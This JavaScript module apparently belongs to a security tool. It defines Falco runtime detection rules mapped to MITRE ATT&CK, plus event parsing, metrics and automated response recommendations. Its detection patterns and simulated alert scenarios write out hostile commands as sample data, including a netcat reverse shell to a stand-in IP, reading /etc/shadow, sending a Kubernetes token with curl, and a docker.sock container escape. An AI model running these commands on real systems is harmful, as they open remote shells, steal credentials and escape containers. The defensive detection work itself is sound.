import { execa } from 'execa';
import fs from 'node:fs/promises';
import fsSync from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { load as yamlLoad, dump as yamlDump } from 'js-yaml';
import { saveEvidenceFile } from './evidence.js';
import { autoSignIfConfigured } from './gpg.js';
import { logger } from '../utils/logger.js';

export const FALCO_PRIORITIES = [
  'EMERGENCY',
  'ALERT',
  'CRITICAL',
  'ERROR',
  'WARNING',
  'NOTICE',
  'INFO',
  'DEBUG'
];

export const PRIORITY_TO_SEVERITY_MAP = {
  EMERGENCY: 'CRITICAL',
  ALERT: 'CRITICAL',
  CRITICAL: 'CRITICAL',
  ERROR: 'HIGH',
  WARNING: 'MEDIUM',
  NOTICE: 'LOW',
  INFO: 'INFO',
  DEBUG: 'INFO'
};

export const MITRE_TACTIC_TAG_MAP = {
  mitre_reconnaissance: { id: 'TA0043', name: 'Reconnaissance' },
  mitre_initial_access: { id: 'TA0001', name: 'Initial Access' },
  mitre_execution: { id: 'TA0002', name: 'Execution' },
  mitre_persistence: { id: 'TA0003', name: 'Persistence' },
  mitre_privilege_escalation: { id: 'TA0004', name: 'Privilege Escalation' },
  mitre_defense_evasion: { id: 'TA0005', name: 'Defense Evasion' },
  mitre_credential_access: { id: 'TA0006', name: 'Credential Access' },
  mitre_discovery: { id: 'TA0007', name: 'Discovery' },
  mitre_lateral_movement: { id: 'TA0008', name: 'Lateral Movement' },
  mitre_collection: { id: 'TA0009', name: 'Collection' },
  mitre_command_and_control: { id: 'TA0011', name: 'Command and Control' },
  mitre_exfiltration: { id: 'TA0010', name: 'Exfiltration' },
  mitre_impact: { id: 'TA0040', name: 'Impact' }
};

/**
 * Built-in Falco Threat Detection Rules Catalog
 */
export const BUILTIN_FALCO_RULES = [
  {
    rule: 'Terminal Shell in Container',
    desc: 'A shell was spawned inside a running container with an attached interactive terminal (PTY)',
    condition: 'spawned_process and container and (proc.name in (bash, sh, zsh, ksh, ash, dash)) and proc.tty != 0',
    output: 'Interactive shell spawned inside container (user=%user.name pod=%k8s.pod.name ns=%k8s.ns.name shell=%proc.name cmdline=%proc.cmdline tty=%proc.tty container_id=%container.id)',
    priority: 'NOTICE',
    source: 'syscall',
    tags: ['container', 'shell', 'mitre_execution', 'T1059.004']
  },
  {
    rule: 'Read Sensitive File Untrusted',
    desc: 'Unauthorized process attempted to read sensitive host or credential files (/etc/shadow, TLS keys, k8s tokens)',
    condition: 'open_read and (fd.name in (/etc/shadow, /etc/gshadow, /etc/kubernetes/admin.conf) or fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount/token") and not proc.name in (login, passwd, sshd, kubelet)',
    output: 'Sensitive file opened for reading by untrusted process (user=%user.name file=%fd.name proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name ns=%k8s.ns.name)',
    priority: 'WARNING',
    source: 'syscall',
    tags: ['filesystem', 'credential_access', 'mitre_credential_access', 'T1003', 'T1552']
  },
  {
    rule: 'Write Below Root or Etc',
    desc: 'Attempt to create or modify system configuration files under /etc directory inside a container',
    condition: 'open_write and fd.name startswith "/etc" and not proc.name in (dpkg, apt-get, apk, yum, rpm, pip)',
    output: 'System configuration modification under /etc (file=%fd.name proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name user=%user.name)',
    priority: 'ERROR',
    source: 'syscall',
    tags: ['filesystem', 'persistence', 'mitre_persistence', 'T1565.001']
  },
  {
    rule: 'Outbound Connection to Suspicious C2 Port',
    desc: 'Outbound network TCP/UDP connection initiated to common attacker Command & Control or shell ports',
    condition: 'outbound and fd.rport in (4444, 1337, 6667, 8888, 9001, 9999) and not proc.name in (curl, wget, git)',
    output: 'Outbound connection to suspicious C2 port (dest=%fd.rip:%fd.rport proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name ns=%k8s.ns.name)',
    priority: 'CRITICAL',
    source: 'syscall',
    tags: ['network', 'command_and_control', 'mitre_command_and_control', 'T1071', 'T1571']
  },
  {
    rule: 'Kubernetes Service Account Token Exfiltration',
    desc: 'Unauthorized process attempting to harvest in-cluster Kubernetes ServiceAccount bearer token',
    condition: 'open_read and fd.name startswith "/var/run/secrets/kubernetes.io/serviceaccount/token" and not proc.name in (kubelet, pause, vigilante)',
    output: 'Kubernetes API bearer token read attempt (pod=%k8s.pod.name ns=%k8s.ns.name proc=%proc.name cmdline=%proc.cmdline user=%user.name)',
    priority: 'CRITICAL',
    source: 'syscall',
    tags: ['k8s', 'credential_access', 'mitre_credential_access', 'T1552.007']
  },
  {
    rule: 'Kernel Module Injection Attempt',
    desc: 'Attempt to dynamically load, modify, or inject a kernel module from within an unprivileged workload',
    condition: '(evt.type in (init_module, finit_module, delete_module) or (open_write and fd.name startswith "/lib/modules")) and container',
    output: 'Kernel module tampering detected in container (evt=%evt.type file=%fd.name proc=%proc.name pod=%k8s.pod.name ns=%k8s.ns.name user=%user.name)',
    priority: 'EMERGENCY',
    source: 'syscall',
    tags: ['kernel', 'privilege_escalation', 'mitre_persistence', 'T1547.006']
  },
  {
    rule: 'Process Memory Injection Ptrace',
    desc: 'Ptrace attachment or process virtual memory manipulation targeting running container processes',
    condition: 'evt.type = ptrace and evt.dir = > and evt.arg.request in (PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_ATTACH) and container',
    output: 'Process memory injection detected (target_pid=%evt.arg.pid proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name)',
    priority: 'CRITICAL',
    source: 'syscall',
    tags: ['injection', 'defense_evasion', 'mitre_defense_evasion', 'T1055']
  },
  {
    rule: 'Container Escape via Host Socket Mount',
    desc: 'Direct interaction with host container engine UNIX sockets (/var/run/docker.sock or containerd.sock)',
    condition: 'open_read_write and fd.name in ("/var/run/docker.sock", "/run/containerd/containerd.sock", "/host/proc") and container',
    output: 'Host container daemon socket access from container (socket=%fd.name proc=%proc.name pod=%k8s.pod.name user=%user.name)',
    priority: 'ALERT',
    source: 'syscall',
    tags: ['container_escape', 'privilege_escalation', 'mitre_privilege_escalation', 'T1611']
  },
  {
    rule: 'Clear Shell History or Evade Logs',
    desc: 'Execution of commands aimed at purging shell history files or truncating system logs',
    condition: 'spawned_process and (proc.cmdline contains "history -c" or proc.cmdline contains "rm -f ~/.bash_history" or proc.cmdline contains "truncate -s 0 /var/log")',
    output: 'Anti-forensics log/history purge detected (proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name user=%user.name)',
    priority: 'WARNING',
    source: 'syscall',
    tags: ['anti_forensics', 'defense_evasion', 'mitre_defense_evasion', 'T1070.003']
  },
  {
    rule: 'Mass File Encryption Ransomware Indicator',
    desc: 'Rapid file encryption and renaming with ransomware extensions (.locked, .crypto, .enc)',
    condition: 'open_write and (fd.name endswith ".locked" or fd.name endswith ".crypto" or fd.name endswith ".enc") and container',
    output: 'Ransomware encryption activity detected (file=%fd.name proc=%proc.name pod=%k8s.pod.name ns=%k8s.ns.name)',
    priority: 'CRITICAL',
    source: 'syscall',
    tags: ['ransomware', 'impact', 'mitre_impact', 'T1486']
  }
];

/**
 * Validate a Falco rule definition object
 * @param {Object} ruleDef
 * @returns {{ valid: boolean, errors: string[] }}
 */
export function validateFalcoRule(ruleDef) {
  const errors = [];
  if (!ruleDef || typeof ruleDef !== 'object') {
    return { valid: false, errors: ['Rule definition must be a valid non-null object.'] };
  }

  if (!ruleDef.rule || typeof ruleDef.rule !== 'string' || ruleDef.rule.trim().length === 0) {
    errors.push('Rule must include a non-empty "rule" string identifier.');
  }

  if (!ruleDef.condition || typeof ruleDef.condition !== 'string' || ruleDef.condition.trim().length === 0) {
    errors.push('Rule must include a non-empty "condition" filter expression.');
  } else {
    // Basic syntax checking for balanced parentheses
    let openCount = 0;
    for (const ch of ruleDef.condition) {
      if (ch === '(') openCount++;
      else if (ch === ')') openCount--;
      if (openCount < 0) {
        errors.push('Condition expression contains unmatched closing parenthesis ")".');
        break;
      }
    }
    if (openCount > 0) {
      errors.push('Condition expression contains unclosed opening parenthesis "(".');
    }
  }

  if (!ruleDef.output || typeof ruleDef.output !== 'string' || ruleDef.output.trim().length === 0) {
    errors.push('Rule must include a non-empty "output" formatting template.');
  }

  if (!ruleDef.priority || typeof ruleDef.priority !== 'string') {
    errors.push('Rule must include a "priority" field.');
  } else {
    const normPri = ruleDef.priority.toUpperCase();
    if (!FALCO_PRIORITIES.includes(normPri)) {
      errors.push(`Invalid priority "${ruleDef.priority}". Allowed priorities: ${FALCO_PRIORITIES.join(', ')}`);
    }
  }

  return {
    valid: errors.length === 0,
    errors
  };
}

/**
 * Parse a raw Falco event string or object into normalized Vigilante event
 * @param {string|Object} raw
 * @returns {Object} Normalized Vigilante event
 */
export function parseFalcoEvent(raw) {
  let ev = raw;
  if (typeof raw === 'string') {
    try {
      ev = JSON.parse(raw);
    } catch {
      // Plain text output fallback
      return {
        id: `falco-txt-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
        source: 'falco',
        time: new Date().toISOString(),
        rule: 'Raw Syscall Event',
        priority: 'Notice',
        severity: 'LOW',
        message: raw,
        output: raw,
        output_fields: {},
        container: 'unknown',
        pod: 'unknown',
        namespace: 'default',
        process: 'unknown',
        cmdline: '',
        user: 'root',
        tags: [],
        mitreTactics: [],
        mitreTechniques: []
      };
    }
  }

  const fields = ev.output_fields || {};
  const rawPriority = (ev.priority || 'Notice').toUpperCase();
  const severity = PRIORITY_TO_SEVERITY_MAP[rawPriority] || 'LOW';

  const tags = Array.isArray(ev.tags) ? ev.tags : [];
  const mitreTactics = [];
  const mitreTechniques = [];

  for (const tag of tags) {
    if (MITRE_TACTIC_TAG_MAP[tag]) {
      mitreTactics.push(MITRE_TACTIC_TAG_MAP[tag]);
    }
    if (/^T\d+(\.\d+)?$/i.test(tag)) {
      mitreTechniques.push(tag.toUpperCase());
    }
  }

  const podName = fields['k8s.pod.name'] || ev.pod || 'unknown';
  const containerName = fields['container.name'] || fields['container.id'] || podName;
  const namespace = fields['k8s.ns.name'] || ev.namespace || 'default';
  const processName = fields['proc.name'] || 'unknown';
  const cmdline = fields['proc.cmdline'] || '';
  const userName = fields['user.name'] || 'root';

  return {
    id: ev.uuid || `falco-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
    uuid: ev.uuid,
    source: 'falco',
    time: ev.time || new Date().toISOString(),
    rule: ev.rule || 'Unknown Rule',
    priority: ev.priority || 'Notice',
    severity,
    message: ev.output || `${ev.rule || 'Falco alert'} on pod ${podName}`,
    output: ev.output || '',
    output_fields: fields,
    container: containerName,
    pod: podName,
    namespace,
    process: processName,
    cmdline,
    user: userName,
    tags,
    mitreTactics,
    mitreTechniques
  };
}

/**
 * Filter Falco events based on criteria
 * @param {Array<Object>} events
 * @param {Object} options
 * @returns {Array<Object>}
 */
export function filterFalcoEvents(events = [], {
  minSeverity = null,
  pod = null,
  namespace = null,
  rule = null,
  tactic = null,
  search = null
} = {}) {
  const severityRank = {
    INFO: 1,
    LOW: 2,
    MEDIUM: 3,
    HIGH: 4,
    CRITICAL: 5
  };

  const minRank = minSeverity ? severityRank[minSeverity.toUpperCase()] || 1 : 1;

  return events.filter(e => {
    if (minSeverity && (severityRank[e.severity] || 1) < minRank) {
      return false;
    }
    if (pod && !e.pod?.toLowerCase().includes(pod.toLowerCase())) {
      return false;
    }
    if (namespace && !e.namespace?.toLowerCase().includes(namespace.toLowerCase())) {
      return false;
    }
    if (rule && !e.rule?.toLowerCase().includes(rule.toLowerCase())) {
      return false;
    }
    if (tactic && !e.mitreTactics?.some(t => t.id === tactic || t.name.toLowerCase().includes(tactic.toLowerCase()))) {
      return false;
    }
    if (search) {
      const q = search.toLowerCase();
      const match = e.rule?.toLowerCase().includes(q)
        || e.message?.toLowerCase().includes(q)
        || e.pod?.toLowerCase().includes(q)
        || e.process?.toLowerCase().includes(q)
        || e.cmdline?.toLowerCase().includes(q);
      if (!match) return false;
    }
    return true;
  });
}

/**
 * Aggregate metrics from Falco events
 * @param {Array<Object>} events
 * @returns {Object}
 */
export function aggregateFalcoMetrics(events = []) {
  const stats = {
    totalEvents: events.length,
    bySeverity: {
      CRITICAL: 0,
      HIGH: 0,
      MEDIUM: 0,
      LOW: 0,
      INFO: 0
    },
    topRules: {},
    topPods: {},
    topNamespaces: {},
    mitreTactics: {}
  };

  for (const e of events) {
    if (stats.bySeverity[e.severity] !== undefined) {
      stats.bySeverity[e.severity]++;
    }
    stats.topRules[e.rule] = (stats.topRules[e.rule] || 0) + 1;
    stats.topPods[e.pod] = (stats.topPods[e.pod] || 0) + 1;
    stats.topNamespaces[e.namespace] = (stats.topNamespaces[e.namespace] || 0) + 1;

    for (const t of (e.mitreTactics || [])) {
      stats.mitreTactics[t.name] = (stats.mitreTactics[t.name] || 0) + 1;
    }
  }

  return {
    totalEvents: stats.totalEvents,
    bySeverity: stats.bySeverity,
    topRules: Object.entries(stats.topRules).sort((a, b) => b[1] - a[1]).slice(0, 5),
    topPods: Object.entries(stats.topPods).sort((a, b) => b[1] - a[1]).slice(0, 5),
    topNamespaces: Object.entries(stats.topNamespaces).sort((a, b) => b[1] - a[1]).slice(0, 5),
    mitreTactics: Object.entries(stats.mitreTactics).sort((a, b) => b[1] - a[1])
  };
}

/**
 * Simulate a realistic Falco event based on an attack scenario
 * @param {string} scenarioId
 * @param {Object} overrides
 * @returns {Object}
 */
export function simulateFalcoEvent(scenarioId = 'shell-spawn', overrides = {}) {
  const now = new Date().toISOString();
  const scenarios = {
    'shell-spawn': {
      rule: 'Terminal Shell in Container',
      priority: 'Notice',
      severity: 'LOW',
      pod: 'web-nginx-ingress-7b4d89-c4k29',
      namespace: 'production',
      container: 'nginx-ingress',
      process: 'bash',
      cmdline: 'bash -i',
      user: 'www-data',
      tags: ['container', 'shell', 'mitre_execution', 'T1059.004'],
      output: 'Interactive shell spawned inside container (user=www-data pod=web-nginx-ingress ns=production shell=bash cmdline="bash -i" tty=/dev/pts/1)'
    },
    'sensitive-file-read': {
      rule: 'Read Sensitive File Untrusted',
      priority: 'Warning',
      severity: 'MEDIUM',
      pod: 'api-gateway-service-89f4b-21a',
      namespace: 'default',
      container: 'gateway-api',
      process: 'cat',
      cmdline: 'cat /etc/shadow',
      user: 'appuser',
      tags: ['filesystem', 'credential_access', 'mitre_credential_access', 'T1003', 'T1552'],
      output: 'Sensitive file opened for reading by untrusted process (user=appuser file=/etc/shadow proc=cat cmdline="cat /etc/shadow" pod=api-gateway-service)'
    },
    'c2-connection': {
      rule: 'Outbound Connection to Suspicious C2 Port',
      priority: 'Critical',
      severity: 'CRITICAL',
      pod: 'database-postgres-pod-0',
      namespace: 'database',
      container: 'postgres',
      process: 'nc',
      cmdline: 'nc -e /bin/sh 198.51.100.42 4444',
      user: 'postgres',
      tags: ['network', 'command_and_control', 'mitre_command_and_control', 'T1071', 'T1571'],
      output: 'Outbound connection to suspicious C2 port (dest=198.51.100.42:4444 proc=nc cmdline="nc -e /bin/sh 198.51.100.42 4444" pod=database-postgres-pod-0)'
    },
    'k8s-token-theft': {
      rule: 'Kubernetes Service Account Token Exfiltration',
      priority: 'Critical',
      severity: 'CRITICAL',
      pod: 'kctf-pwn-echo-challenge-59fd',
      namespace: 'kctf-sandboxes',
      container: 'challenge',
      process: 'curl',
      cmdline: 'curl -s --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc',
      user: 'ctf-user',
      tags: ['k8s', 'credential_access', 'mitre_credential_access', 'T1552.007'],
      output: 'Kubernetes API bearer token read attempt (pod=kctf-pwn-echo ns=kctf-sandboxes proc=curl user=ctf-user)'
    },
    'container-escape': {
      rule: 'Container Escape via Host Socket Mount',
      priority: 'Alert',
      severity: 'CRITICAL',
      pod: 'compromised-runner-pod-9x7',
      namespace: 'kube-system',
      container: 'runner',
      process: 'docker',
      cmdline: 'docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host',
      user: 'root',
      tags: ['container_escape', 'privilege_escalation', 'mitre_privilege_escalation', 'T1611'],
      output: 'Host container daemon socket access from container (socket=/var/run/docker.sock proc=docker pod=compromised-runner-pod-9x7 user=root)'
    },
    'ransomware-encryption': {
      rule: 'Mass File Encryption Ransomware Indicator',
      priority: 'Critical',
      severity: 'CRITICAL',
      pod: 'storage-vault-daemon-3f1b',
      namespace: 'storage',
      container: 'vault',
      process: 'cryptor',
      cmdline: 'cryptor -d /var/data --ext .locked',
      user: 'root',
      tags: ['ransomware', 'impact', 'mitre_impact', 'T1486'],
      output: 'Ransomware encryption activity detected (file=/var/data/secrets.db.locked proc=cryptor pod=storage-vault-daemon-3f1b)'
    }
  };

  const template = scenarios[scenarioId] || scenarios['shell-spawn'];
  const event = {
    ...template,
    ...overrides,
    time: now
  };

  return parseFalcoEvent({
    uuid: `falco-sim-${Date.now()}-${crypto.randomBytes(3).toString('hex')}`,
    time: now,
    rule: event.rule,
    priority: event.priority,
    output: event.output,
    output_fields: {
      'k8s.pod.name': event.pod,
      'k8s.ns.name': event.namespace,
      'container.name': event.container,
      'proc.name': event.process,
      'proc.cmdline': event.cmdline,
      'user.name': event.user
    },
    tags: event.tags
  });
}

/**
 * Recommend automated SOAR action based on a Falco detection event
 * @param {Object} event
 * @returns {{ action: string, description: string, target: string, recommendedSlaMinutes: number }}
 */
export function evaluateFalcoSoarAction(event) {
  if (!event) {
    return { action: 'NO_ACTION', description: 'No event provided', target: '', recommendedSlaMinutes: 60 };
  }

  const tags = event.tags || [];
  const pod = event.pod || 'unknown';
  const ns = event.namespace || 'default';

  if (tags.includes('T1611') || event.priority?.toUpperCase() === 'EMERGENCY') {
    return {
      action: 'ISOLATE_POD',
      description: `Immediately isolate container pod '${pod}' in namespace '${ns}' using Quarantine NetworkPolicy to prevent cluster takeover.`,
      target: `${ns}/${pod}`,
      recommendedSlaMinutes: 5
    };
  }

  if (tags.includes('T1486') || tags.includes('ransomware')) {
    return {
      action: 'FREEZE_POD',
      description: `Suspend (SIGSTOP) all process execution in pod '${pod}' in namespace '${ns}' to halt cryptographic ransomware encryption.`,
      target: `${ns}/${pod}`,
      recommendedSlaMinutes: 2
    };
  }

  if (tags.includes('T1071') || tags.includes('T1571')) {
    const rip = event.output_fields?.['fd.rip'] || '198.51.100.42';
    return {
      action: 'BLOCK_IP',
      description: `Enforce egress firewall drop rule for adversary Command & Control IP '${rip}'.`,
      target: rip,
      recommendedSlaMinutes: 10
    };
  }

  if (tags.includes('T1552.007') || tags.includes('k8s')) {
    return {
      action: 'QUARANTINE_SERVICE_ACCOUNT',
      description: `Bind zero-permission Deny-All ClusterRole to ServiceAccount used by pod '${pod}'.`,
      target: `${ns}/${pod}`,
      recommendedSlaMinutes: 15
    };
  }

  return {
    action: 'LOG_AND_ENRICH',
    description: `Correlate detection '${event.rule}' with OpenSearch SIEM and threat intelligence feeds.`,
    target: `${ns}/${pod}`,
    recommendedSlaMinutes: 30
  };
}

/**
 * Render an array of Falco rule objects into YAML
 * @param {Array<Object>} rules
 * @returns {string}
 */
export function renderFalcoRulesYaml(rules = BUILTIN_FALCO_RULES) {
  return yamlDump(rules, { indent: 2, lineWidth: -1 });
}

/**
 * Parse a Falco rules YAML string
 * @param {string} yamlContent
 * @returns {Array<Object>}
 */
export function parseFalcoRulesYaml(yamlContent) {
  try {
    const parsed = yamlLoad(yamlContent);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    logger.error('FALCO', `Failed to parse Falco rules YAML: ${err.message}`);
    return [];
  }
}

/**
 * Save Falco alert bundle in Evidence Vault
 * @param {string} target
 * @param {Array<Object>} events
 * @returns {Promise<string>}
 */
export function saveFalcoEvidence(target = 'cluster-runtime', events = []) {
  const filename = `falco-alerts-${Date.now()}.json`;
  const content = JSON.stringify({
    target,
    savedAt: new Date().toISOString(),
    eventCount: events.length,
    events,
    metrics: aggregateFalcoMetrics(events)
  }, null, 2);

  return saveEvidenceFile(target, 'falco', filename, content);
}
